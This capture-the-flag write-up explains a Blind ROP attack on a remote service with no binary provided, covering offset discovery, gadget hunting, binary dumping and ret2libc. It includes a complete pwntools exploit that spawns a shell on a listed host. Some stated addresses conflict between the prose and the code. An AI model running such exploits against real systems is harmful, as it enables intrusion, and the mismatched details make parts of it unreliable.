# blindsight

## Challenge

We are given only the libc file and no binary.

Connecting to the challenge, it prints:

```
Are you blind my friend?
```

and waits for input.
When it receives input normally, it responds with:

```
No password for you!
```

and exits.

## Solution

If we send a short input such as "hello", we get the "No password for you!" response.
However, if we send a very long input, like a hundred characters or so, we get no response.
This is likely a buffer overflow vulnerability causing the program to crash before it can print
the normal response.

We have no binary, so to use ROP gadgets we have to find them by testing the program.
This can be done using a technique called Blind Return-Oriented Programming (BROP).

During this challenge, I found the following resources extremely helpful:

- [BROP writeup by OSI Layer 8](https://github.com/nushosilayer8/pwn/blob/master/brop/README.md)
- ["Hacking Blind" BROP paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)

### Get offset

We can get the offset from the buffer to the return address by finding the maximum number of
characters we can send while still getting the normal response.
In this case, we can send 88 characters and still get the "No password for you!" response.

At this stage, we have to make some reasonable assumptions:

- **The caller function does not depend on its local variables to print a response.**
    This is because, to overwrite the saved RIP, we must also overwrite the saved RBP.
    When we overwrite RBP, the caller will lose its local variables.
    If it depended on these to print the response and we overwrote just the RBP, we may get no
    output but we would also have no feedback when overwriting RIP.

- **There is no stack canary or the stack canary is constant.**
    Without leaks, we can only defeat a stack canary by bruteforcing it one byte at a time.
    If the stack canary is randomized for each run, we would not be able to bruteforce it.

These two assumptions are required for this particular exploit.
This is not too uncommon of a situation though, many other challenges also share these traits.

With those assumptions, we can infer that the saved RIP is 88 characters from the buffer.

**Update**:
I previously said that the technique requires PIE disabled or ALSR disabled.
This is not necessarily true.
The address of the binary may still be consistent between runs if fork is used to serve
connections, similar to how the canary may be constant.
The address will still be random however, but this can still be exploited by using a partial
overwrite of the least significant 16 bits, rather than a full overwrite of the address.
Using a partial overwrite, the necessary gadgets can be found by bruteforcing only these 16 bits.

BROP is also possible with a binary address that is randomized between runs.
The lower 12 bits will have to be checked systematically, as with a regular BROP.
The next 4 bits will be random and change every run, so these can be set to a constant value.
On average, the 4 bits will be correct in 8 guesses.
Due to the randomness in this technique, each guess for the lower 12 bits has to be tried a number
of times before one can be confident that it does not contain the desired gadget.

Thanks to yrp for bringing this up.

### Find STOP gadget

Now that we can overwrite the return address, we need to find an address that will give us some
indication that we don't immediately segfault when returning.
We know that such addresses exist in the binary as it prints a welcome message.
If we can find the address of the `main` function, we can get it to print this message again.

Assuming no PIE, the base address of the binary will be 0x400000.
We can start by overwriting RIP with this address and slowly incrementing it until we get the
expected output.

Eventually, we find that the first address which prints "Are you blind my friend?" a second time is
0x4006b6.
This is our STOP gadget, which will be useful for finding more gadgets.

### Find BROP gadget

The BROP gadget is `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;` which can be used
to derive other gadgets, such as `pop rdi; ret;`.

This gadget is useful as it is easily identifiable due to it popping values from the stack before
returning.
It is also useful for the number of registers that can be controlled using this.

To find the gadget, we can overwrite the saved RIP with a candidate address, skip 6 addresses, then
write our STOP gadget twice.

```
BROP?
PAD6
STOP
STOP
```

Where `PAD6` is 6 qwords of padding which are popped by the BROP gadget.

When we successfully find the BROP gadget, we expect to see the `main` welcome message repeated
once, have the program wait for input, then repeat the welcome message once more.

The original writeup only uses one STOP gadget, however, this runs into the risk of confusing a
`main` address for the BROP gadget.
For example:

```
STOP <- 1st return
PAD6 <- 2nd return
STOP
```

OR

```
BROP <- 1st return
PAD6
STOP <- 2nd return
```

In both instances, the feedback will seem identical.
There are possibly multiple STOP gadgets, so it is ideal to avoid this source of ambiguity.
Using 2 STOP gadgets, the above scenarios change to:

```
STOP <- 1st return
PAD6 <- 2nd return
STOP
STOP
```

OR

```
BROP <- 1st return
PAD6
STOP <- 2nd return
STOP <- 3rd return
```

And we can be certain if we hit a BROP gadget.

Using this technique, we find that our BROP gadget is at 0x4007ba.

### Find leak function

Next we need to call a function we can use to leak values from memory.
This is needed to defeat ASLR by leaking addresses from the GOT.

An example of such a function is the one thats used to print the welcome message and response.
Assuming it takes a pointer to the string as its first argument, we can leak from any address
using BROP+9, which is a `pop rdi; ret;` gadget.

We know that this function is called somewhere in `main`, so we can start searching at the STOP
gadget address.
For the string, we pass it the base address of the binary, 0x400000, as we know this will be
`\x7fELF`.

We continously increment the candidate address until we get an output that includes `\x7fELF`.
Using this technique, we find that the leaking function is called at address 0x4006fb.

### Dump binary

Optionally, we can dump the binary using the leaking function.
This is not necessary for the exploit, but it can give us some useful information, such as what
functions are in the GOT and at what offsets.

The problem with dumping the binary is if the program uses a function that stops at newlines when
reading inputs.
This will make it impossible to leak at addresses containing a newline.
Fortunately for us, this program happened to use `read` and this was not an issue.

Dumping the binary until the program segfaulted, we were able to read 0x1000 bytes, which was just
the executable section of the binary.
This resulted in some missing data in the file, but it was enough to gain some information about
the control flow and the layout of the GOT.

```c
undefined8 main(void) {
    int32_t iVar1;
    
    fcn.00400570(*(undefined8 *)0x601070, 0);
    fcn.00400570(*(undefined8 *)0x601060, 0);
    fcn.00400570(*(undefined8 *)0x601080, 0);
    fcn.00400560(0x4007e8);
    iVar1 = fcn.0040072b();
    if (iVar1 == 0) {
        fcn.00400560(0x400801);
    }
    else {
        fcn.00400560(0x400818);
    }
    return 0;
}

void fcn.0040072b(void) {
    int64_t var_50h;
    
    fcn.00400580(0, &var_50h, 0x400);
    fcn.004005a0(&var_50h, 0x400830);
    return;
}

void fcn.00400560(void) {
    // WARNING: Could not recover jumptable at 0x00400560. Too many branches
    // WARNING: Treating indirect jump as call
    (**(code **)0x601018)();
    return;
}
```

`fcn.00400560` is a PLT entry that seems to be pointing at `read`, since it uses 0 (stdin file
descriptor) as its first argument, with a buffer and size as the other 2 arguments.
Thus, we can infer that 0x601018 is the GOT entry for `read`.

### Ret2libc

Using the offset, `pop rdi; ret;` gadget, and leaking function, we can construct a standard
ret2libc payload.

We start by leaking the GOT entry for `read` and calculating the libc address.
Here the libc was given, though we could have easily found the correct version by leaking
multiple function addresses from the GOT and comparing their offsets in a libc database.

Once we have the address of libc, we can call `system("/bin/sh")` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.246.134.224 --port 30764
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
libc = ELF('libc-2.23.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '35.246.134.224'
port = int(args.PORT or 30764)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# LEAK MAIN

'''
addr = 0x4006b6

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: addr,
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recvline(timeout=4)
        if b"Are you blind my friend?\n" in res:
            print(hex(addr))
            break
    except:
        io.close()

    addr += 1
'''
stop = 0x4006b6



# LEAK BROP

'''
addr = 0x4007ba

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: [
            addr,
            0,
            0,
            0,
            0,
            0,
            0,
            stop,
            stop,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recvuntil(b"Are you blind my friend?\n", timeout=4)
        if len(res) != 0:
            io.sendline(b'a')
            io.recvuntil(b"No password for you!\n")
            res = io.recv(1, timeout=4)
            print(hex(addr))
            break
        else:
            io.close()
    except:
        io.close()

    addr += 1
'''
brop = 0x4007ba



# FIND LEAKING FUNCTION

'''
addr = 0x4006fb

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: [
            brop+9,
            0x400000,
            addr,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recv(4, timeout=4)
        if b'ELF' in res:
            print(io.recvline())
            print(hex(addr))
            break
        else:
            io.close()
    except:
        io.close()

    addr += 1
'''

leak_func = 0x4006fb



# DUMP BINARY

'''
current_addr = 0x400000

f = open('vuln', 'wb')
while True:
    print("*** READING {} ***".format(hex(current_addr)))
    io = start()
    payload = flat({
        0x58: [
            brop+9,
            current_addr,
            leak_func,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recv(timeout=4)
        current_addr += len(res)
        res = res[:-1] + b'\x00'
        print(res)
        f.write(res)
        io.close()
    except:
        io.close()
        break
f.close()
'''
read_got = 0x601028



# RET2LIBC

io = start()
payload = flat({
    0x58: [
        brop+9,
        read_got,
        leak_func,
        stop,
        ],
    })

io.sendlineafter(b"Are you blind my friend?\n", payload)

leak = io.recvuntil(b'\n', drop=True)
libc.address = unpack(leak.ljust(8, b'\x00')) - libc.sym['read']
io.success("LIBC : " + hex(libc.address))

payload = flat({
    0x58: [
        brop+9,
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
        ],
    })

io.sendline(payload)

io.interactive()
```

## Flag

```
CTF{313f12378d33889716128e329457030182023d103ab648b072fa1e839713dab5}
```
